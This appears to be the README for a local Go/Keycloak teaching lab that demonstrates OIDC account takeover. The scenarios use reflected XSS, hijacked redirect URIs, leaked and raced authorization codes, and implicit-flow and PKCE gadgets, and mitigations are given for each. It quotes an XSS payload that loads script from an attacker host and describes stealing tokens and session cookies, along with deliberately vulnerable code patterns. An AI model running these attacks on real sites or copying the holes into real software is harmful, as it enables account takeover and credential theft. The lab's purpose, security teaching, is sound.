# OIDC Authorization Code Flow demo (Keycloak) + XSS token-theft lab

> **See also:** [`s1-implicit-flow/`](s1-implicit-flow/),
> [`s2-confidential-no-pkce/`](s2-confidential-no-pkce/),
> [`s3-spa-pkce/`](s3-spa-pkce/) — three self-contained Go PoCs reproducing the
> XSS→ATO SSO gadgets from
> <https://security.lauritz-holtmann.de/post/xss-ato-gadgets/>. Shared Keycloak
> setup for those is in [`keycloak/`](keycloak/); details at the bottom of this
> file.

This is a local teaching lab, not a tool for attacking real systems. It has
two pieces:

- `auth_code.go` (package `main`, port `8081`) - the **victim** relying party
  (RP). Logs a user in against Keycloak with the OIDC Authorization Code
  Flow and renders every step of the handshake. It also ships an
  intentionally vulnerable `/search` endpoint (reflected XSS).
- `attacker/main.go` (port `9090`) - a rogue server with two independent
  attack scenarios against the RP above.

Everything talks to a Keycloak instance you run yourself.

**Scenario 1** (`demo-rp`, public client): reflected XSS -> hijacked
redirect_uri -> attacker redeems the code itself -> attacker gets tokens.

**Scenario 2** (`demo-conf`, confidential client): hidden iframe -> silent
SSO login -> leaked code -> attacker races the RP's own backend to redeem
it -> attacker never sees the client secret or tokens, but steals a
legitimate session cookie instead.

## 1. Start Keycloak

```sh
docker run -d --name kc-demo -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:25.0 start-dev
```

Open http://localhost:8080, log in as `admin`/`admin`.

## 2. Create the realm, client and user

1. Create realm **demo**.
2. Create client **demo-rp**:
   - Client authentication: **Off** (public client, no secret - simplifies
     this demo; do not do this in production, see "Mitigations" below).
   - Standard flow (Authorization Code): **On**.
   - Valid redirect URIs (this is the deliberate misconfiguration the attack
     exploits):
     - `http://localhost:8081/*`
     - `http://localhost:9090/*`
   - Web origins: `+`
3. Create a test user (e.g. `alice` / `alice123`), set a permanent password.
4. Create a second client **demo-conf** for scenario 2:
   - Client authentication: **On** (confidential client).
   - Standard flow (Authorization Code): **On**.
   - Valid redirect URIs (strict this time, no attacker URI needed):
     - `http://localhost:8081/conf/callback`
   - Credentials tab -> copy the **client secret**. Either edit the
     `changeme-copy-from-keycloak` fallback in `auth_code.go`, or run the RP
     with `DEMO_CONF_CLIENT_SECRET=<secret> go run .`

## 3. Run the demo apps

From this `OIDC/` directory:

```sh
go run .              # legit RP,      http://localhost:8081
go run ./attacker      # attacker server, http://localhost:9090
```

## 4. Normal login (happy path)

Open http://localhost:8081, click **Log in with Keycloak**, authenticate as
`alice`. You land on `/profile`, which shows the full handshake log, the
decoded ID token claims, and the (truncated) access token.

## 5. The attack: reflected XSS -> stolen authorization code -> stolen tokens

While still logged into Keycloak in your browser (active SSO session):

1. Open http://localhost:9090 - the attacker's page shows a crafted
   malicious link and the payload it will inject.
2. Open that link (it points at the victim RP's vulnerable
   `/search?q=<script src="http://localhost:9090/payload.js"></script>`).
   The RP reflects the query unescaped, so the script executes in the
   **RP's origin**, in the victim's authenticated browser.
3. The injected script (`/payload.js`) redirects the browser to Keycloak's
   `/auth` endpoint, but with `redirect_uri=http://localhost:9090/callback`
   instead of the legit RP's callback.
4. Because the browser already has a Keycloak SSO session, Keycloak
   silently reissues an authorization code and 302s the browser to the
   attacker's redirect_uri - Keycloak allows it because that URI is (mis)
   registered on the client.
5. The attacker's `/callback` grabs the `code` and redeems it directly with
   Keycloak's token endpoint. It now has the victim's access/id tokens -
   shown on the attacker dashboard, and logged to its console.

## Why this works / mitigations

- **Reflected XSS is the root cause**: the RP must HTML-escape all
  untrusted output (Go's `html/template` does this automatically - the demo
  bypasses it on purpose with `template.HTML(q)`). Never do that with
  untrusted input.
- **Loose `redirect_uri` allow-list**: production clients must register a
  single exact redirect URI per environment, never a wildcard or multiple
  origins spanning trust boundaries.
- **PKCE** (`code_verifier`/`code_challenge`) stops a network attacker from
  redeeming an intercepted code, but does **not** stop this attack, because
  the XSS payload runs attacker-controlled JS that can generate its own
  PKCE pair and drive the whole flow itself. XSS defenses (output encoding,
  CSP, avoiding `dangerouslySetInnerHTML`/raw template injection) are what
  actually close this hole.
- **`state`** protects the callback from CSRF (forged callback requests),
  but here the attacker isn't forging the callback - they're driving a
  genuine flow via a stolen redirect_uri, so `state` alone doesn't help
  either.
- A strict **Content-Security-Policy** would have blocked the injected
  `<script src=...>` from loading in the first place.

## 6. Scenario 2: confidential client, hidden iframe + leaked code

This one shows that a confidential client (client_secret held server-side,
as in a typical backend-for-frontend app) isn't automatically safe either -
it just changes what the attacker walks away with.

While still logged into Keycloak in your browser (active SSO session):

1. Open http://localhost:9090/lure - it looks like an empty/broken page.
   In reality it contains a hidden `<iframe>` pointing at the RP's
   `/conf/login`. In a real attack this page would be reached via phishing,
   malvertising, a forum post, etc. - the victim never needs to visit the
   vulnerable RP endpoint from scenario 1 at all.
2. Because the iframe's browsing context already has a Keycloak SSO
   session, the flow completes with zero user interaction: iframe ->
   `/conf/login` -> Keycloak `/auth` -> silently redirected back to the
   RP's `/conf/callback?code=...&state=...`.
3. The RP's callback page (`templates/conf_callback.html`) is written to
   model a real bug: it embeds a third-party "analytics beacon"
   (`<img src=".../collect?code=...">`) *before* redeeming the code, and
   only asks its own backend to finish the exchange 1.5s later.
4. The attacker's `/collect` endpoint receives the leaked code instantly
   and immediately calls the RP's own `/conf/finish?code=...` - racing (and
   beating) the real browser's delayed request. The RP backend redeems the
   code with Keycloak using `demo-conf`'s client secret, creates a session,
   and returns `Set-Cookie: oidc_session=...`.
5. The attacker's HTTP client captures that `Set-Cookie` directly from the
   response - see http://localhost:9090/loot. The attacker never sees the
   client secret or any access/id token; the real victim's browser, arriving
   1.5s later with an already-used code, gets an `invalid_grant` error from
   the RP instead of logging in.

### Why this works / mitigations (scenario 2)

- **The code leak, not the client type, is the root cause.** Confidential
  clients protect the *token exchange* (only the backend, which holds the
  secret, can redeem a code) but do nothing to protect the *code* itself
  once it's in a URL that gets shared with a third party.
- **Never put a code (or any secret) in a URL that a third-party
  script/pixel/beacon can observe.** Redeem it server-side in the very same
  request that receives the callback, before rendering anything that loads
  cross-origin resources; don't render an interim page for a "just a
  moment..." delay.
- **PKCE doesn't help here either**: it stops a network eavesdropper from
  redeeming a code without the matching verifier, but the RP itself already
  has the verifier server-side and would happily redeem the leaked code for
  whoever asks first - the race is between the RP's own two code paths, not
  between the attacker and Keycloak.
- **Treat authorization codes as bearer secrets with a race condition
  attached**: they're single-use, so the real defense is to never let them
  leave the server that's about to redeem them.
- Framing protections (`X-Frame-Options: DENY` / `Content-Security-Policy:
  frame-ancestors 'none'`) on the RP would have stopped the hidden iframe
  from loading `/conf/login` cross-site in the first place.

---

# SSO gadgets lab — XSS → account takeover (3 standalone scenarios)

Reproduces the three gadgets from
<https://security.lauritz-holtmann.de/post/xss-ato-gadgets/>. Each scenario is
its own directory with its own `go.mod`, a victim RP (`main.go`) and an
attacker server (`attacker/main.go`), plus a `readme.md`:

| dir | IdP client (mis)config | what the XSS does |
|-----|------------------------|-------------------|
| [`s1-implicit-flow/`](s1-implicit-flow/) | code+PKCE client, but implicit flow left enabled | silent `response_type=token&prompt=none` → `access_token` from the URL fragment |
| [`s2-confidential-no-pkce/`](s2-confidential-no-pkce/) | confidential client, code flow, no PKCE, no `state` binding | silent `response_type=code&response_mode=fragment` → leak `code` → authorization-code **injection** into the RP's own callback → victim session cookie |
| [`s3-spa-pkce/`](s3-spa-pkce/) | public SPA client, code flow, PKCE **S256 enforced** | payload generates its **own** PKCE pair, leaks `code` from the fragment, redeems it at the token endpoint (public client, no secret) → `access_token` |

Ports: RPs `8101/8102/8103`, attackers `9101/9102/9103`, Keycloak `8080`.

## Preconditions (same as the article)

1. Victim has an **active session** at the IdP (in the lab: log in once at the
   RP's `/login` as `victim` / `victim`).
2. Victim previously **consented** to the client — disabled in the lab
   (`consentRequired: false`) so the flow is fully silent.
3. IdP supports **`prompt=none`** — Keycloak does.

## 1. Start Keycloak (Docker)

```sh
docker compose -f keycloak/docker-compose.yml up
```

Keycloak 26 on <http://127.0.0.1:8080> (`admin` / `admin`). The realm
`xss-ato` — with the three deliberately (mis)configured clients and the
`victim` / `attacker` users — is imported from
[`keycloak/realm-export.json`](keycloak/realm-export.json) on startup.

*Already running a Keycloak on 8080* (e.g. the one for `s4-dirty-dance/`)?
Don't use the compose file — load the realm into that instance instead:

```sh
bash keycloak/setup.sh
```

It (re)creates the `xss-ato` realm from `realm-export.json` and force-sets the
`victim` / `attacker` passwords via the admin API. Safe to re-run.

## 2. Run a scenario

```sh
cd s1-implicit-flow        # or s2-confidential-no-pkce / s3-spa-pkce
go run .                   # victim RP
go run ./attacker          # attacker server (separate terminal)
```

Then follow that directory's `readme.md`: log in as `victim` at the RP, open
the attacker page, click the reflected-XSS link, watch the attacker console /
`/loot` show the victim's token (or session) and a `userinfo` response with
`preferred_username: victim`.

### Troubleshooting

* **Attacker `/loot` says `gadget FAILED: login_required`** — the victim has no
  active Keycloak session. Open the RP's `/login` and sign in as
  `victim` / `victim` *first*, then re-open the XSS link.
* **The RP login itself says "Invalid username or password"** — the realm
  users lost their password (happens when the realm was loaded over the admin
  REST API rather than `--import-realm`). Run `bash keycloak/setup.sh`.
* **`/loot` shows nothing at all** — the payload didn't run: check the RP is on
  the expected port and that `/search` reflects `q` unescaped (`curl
  "http://127.0.0.1:8101/search?q=<b>x"` should echo a raw `<b>`).

## Mitigations (all three)

- Use the **code flow with PKCE** for every client and **disable every unused
  `response_type`** (kills gadget 1).
- **Bind and verify `state`/`nonce`** to the browser session; keep
  `response_mode=query` and redeem the `code` server-side in the same request
  (kills gadget 2).
- For SPAs, keep tokens out of page JS — **token-mediating backend (BFF)** or a
  **service worker** (OAuth 2.0 for Browser-Based Apps BCP) (limits gadget 3).
- Evaluate whether the client needs **`prompt=none`** at all; disable if not.
- And the root cause: **no XSS** — output encoding, strict CSP,
  `frame-ancestors 'none'`. The gadgets only turn "XSS in the app" into "full
  account takeover".
